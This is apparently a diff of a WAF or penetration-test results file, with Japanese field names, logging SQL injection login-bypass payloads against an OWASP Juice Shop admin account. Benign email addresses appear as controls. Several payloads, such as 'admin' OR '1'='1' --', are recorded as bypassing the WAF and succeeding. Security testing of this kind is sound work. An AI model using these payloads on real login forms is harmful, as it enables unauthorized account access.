@@ -1,62 +1,116 @@
 [
     {
-        "ペイロード": "admin@juice-shop.com' OR '1'='1",
-        "WAF": "Allowed",
-        "ステータスコード": 401,
-        "攻撃結果": false
-    },
-    {
-        "ペイロード": "admin@juice-shop.com' OR 1=1 --",
-        "WAF": "Allowed",
-        "ステータスコード": 200,
-        "攻撃結果": true
-    },
-    {
-        "ペイロード": "admin@juice-shop.com' UNION SELECT null, null, null--",
+        "ペイロード": "' OR ''='', ''=''' OR '1'='1' --",
         "WAF": "Allowed",
         "ステータスコード": 500,
         "攻撃結果": false
     },
     {
-        "ペイロード": "admin@juice-shop.com' OR 'a'='a",
-        "WAF": "Allowed",
-        "ステータスコード": 401,
-        "攻撃結果": false
-    },
-    {
-        "ペイロード": "admin@juice-shop.com' OR 'x'='x",
-        "WAF": "Allowed",
-        "ステータスコード": 401,
-        "攻撃結果": false
-    },
-    {
-        "ペイロード": "admin@juice-shop.com' OR '1'<'2",
-        "WAF": "Allowed",
-        "ステータスコード": 401,
-        "攻撃結果": false
-    },
-    {
-        "ペイロード": "admin@juice-shop.com' OR '1'>'0",
-        "WAF": "Allowed",
-        "ステータスコード": 401,
-        "攻撃結果": false
-    },
-    {
-        "ペイロード": "admin@juice-shop.com' OR 1=1 LIMIT 1 --",
-        "WAF": "Allowed",
-        "ステータスコード": 200,
-        "攻撃結果": true
-    },
-    {
-        "ペイロード": "admin@juice-shop.com' OR '1'='1'#",
+        "ペイロード": "' OR ''='' OR '1'='1' UNION SELECT null,null--",
         "WAF": "Allowed",
         "ステータスコード": 500,
         "攻撃結果": false
     },
     {
-        "ペイロード": "admin@juice-shop.com' OR 1=1/*",
+        "ペイロード": "' OR ''='' OR '1'='1' --+ ",
         "WAF": "Allowed",
         "ステータスコード": 200,
         "攻撃結果": true
+    },
+    {
+        "ペイロード": "admin' OR 1=1 LIMIT 1--",
+        "WAF": "Allowed",
+        "ステータスコード": 200,
+        "攻撃結果": true
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' /*",
+        "WAF": "Allowed",
+        "ステータスコード": 200,
+        "攻撃結果": true
+    },
+    {
+        "ペイロード": "admin' OR '1'='1'#",
+        "WAF": "Allowed",
+        "ステータスコード": 500,
+        "攻撃結果": false
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' --",
+        "WAF": "Allowed",
+        "ステータスコード": 200,
+        "攻撃結果": true
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' %23",
+        "WAF": "Allowed",
+        "ステータスコード": 500,
+        "攻撃結果": false
+    },
+    {
+        "ペイロード": "' OR ''='' OR 1=1--",
+        "WAF": "Allowed",
+        "ステータスコード": 200,
+        "攻撃結果": true
+    },
+    {
+        "ペイロード": "admin' OR '1'='1'/* ",
+        "WAF": "Allowed",
+        "ステータスコード": 200,
+        "攻撃結果": true
+    },
+    {
+        "ペイロード": "info@company.co.jp",
+        "WAF": "Allowed",
+        "ステータスコード": 401,
+        "攻撃結果": false
+    },
+    {
+        "ペイロード": "O'Brien@example.com",
+        "WAF": "Allowed",
+        "ステータスコード": 500,
+        "攻撃結果": false
+    },
+    {
+        "ペイロード": "test@example.com",
+        "WAF": "Allowed",
+        "ステータスコード": 401,
+        "攻撃結果": false
+    },
+    {
+        "ペイロード": "user_123@mail.net",
+        "WAF": "Allowed",
+        "ステータスコード": 401,
+        "攻撃結果": false
+    },
+    {
+        "ペイロード": "test@example.com",
+        "WAF": "Allowed",
+        "ステータスコード": 401,
+        "攻撃結果": false
+    },
+    {
+        "ペイロード": "yamada.taro@gmail.com",
+        "WAF": "Allowed",
+        "ステータスコード": 401,
+        "攻撃結果": false
+    },
+    {
+        "ペイロード": "O'Brien@example.com",
+        "WAF": "Allowed",
+        "ステータスコード": 500,
+        "攻撃結果": false
+    },
+    {
+        "ペイロード": "info@company.co.jp",
+        "WAF": "Allowed",
+        "ステータスコード": 401,
+        "攻撃結果": false
+    },
+    {
+        "ペイロード": "user_123@mail.net",
+        "WAF": "Allowed",
+        "ステータスコード": 401,
+        "攻撃結果": false
     }
 ]
